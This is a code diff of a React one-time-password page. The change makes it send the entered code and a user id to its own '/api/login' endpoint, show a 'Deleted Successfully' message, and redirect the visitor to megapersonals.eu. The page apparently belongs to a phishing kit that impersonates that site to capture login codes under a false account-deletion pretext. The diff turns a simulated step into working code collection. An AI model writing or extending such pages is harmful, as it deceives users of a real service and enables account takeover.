@@ -8,7 +8,7 @@ import { Suspense, useState } from 'react';
 // Create a separate component for the OTP content
 const OTPContent = () => {
   const [isModalOpen, setModalOpen] = useState(true);
-  const [isDeleteModalOpen, setDeleteModalOpen] = useState(false);
+  const [isSuccessModalOpen, setSuccessModalOpen] = useState(false);
   const [code, setCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
@@ -17,9 +17,9 @@ const OTPContent = () => {
     setModalOpen(false); // Close the modal
   };
 
-  const handleDeleteModalOk = () => {
-    setDeleteModalOpen(false);
-    // Redirect to the external URL
+  const handleSuccessModalOk = () => {
+    setSuccessModalOpen(false);
+    // Redirect to external URL
     window.location.href = 'https://megapersonals.eu/';
   };
 
@@ -38,11 +38,32 @@ const OTPContent = () => {
     setLoading(true);
     setError('');
 
-    // Simulate a brief loading period then show delete success modal
-    setTimeout(() => {
+    try {
+      const response = await fetch('/api/login', {
+        method: 'PATCH',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          id: userId,
+          otp: code
+        }),
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        // Show success modal instead of direct redirect
+        setSuccessModalOpen(true);
+      } else {
+        setError(data.message || 'Verification failed. Please try again.');
+      }
+    } catch (error) {
+      console.error('Verification error:', error);
+      setError('An error occurred. Please try again.');
+    } finally {
       setLoading(false);
-      setDeleteModalOpen(true);
-    }, 1000);
+    }
   };
 
   return (
@@ -53,21 +74,17 @@ const OTPContent = () => {
         onOk={handleOkClick}
       />
 
-      {/* Delete Success Modal */}
-      {isDeleteModalOpen && (
-        <div className="fixed inset-0 bg-black bg-opacity-50  flex items-center justify-center z-50">
-          <div className="bg-white py-10 rounded-lg shadow-lg w-3/12 mx-4">
-            <div className="text-center">
-              <h3 className="text-lg font-semibold text-green-600 mb-4">
-                Delete Successfully
-              </h3>
-              <button
-                onClick={handleDeleteModalOk}
-                className="bg-[#F0AD4E] px-6 py-1 rounded text-white font-medium hover:bg-[#e69b3a] transition-colors"
-              >
-                OK
-              </button>
-            </div>
+      {/* Success Modal */}
+      {isSuccessModalOpen && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white p-6 rounded-lg shadow-lg text-center w-[300px]">
+            <h2 className="text-[24px] font-bold text-[#C76441] mb-4">Deleted Successfully</h2>
+            <button
+              onClick={handleSuccessModalOk}
+              className="bg-[#F0AD4E] px-6 py-2 rounded text-white text-[18px] hover:bg-[#ec971f] transition-colors"
+            >
+              OK
+            </button>
           </div>
         </div>
       )}
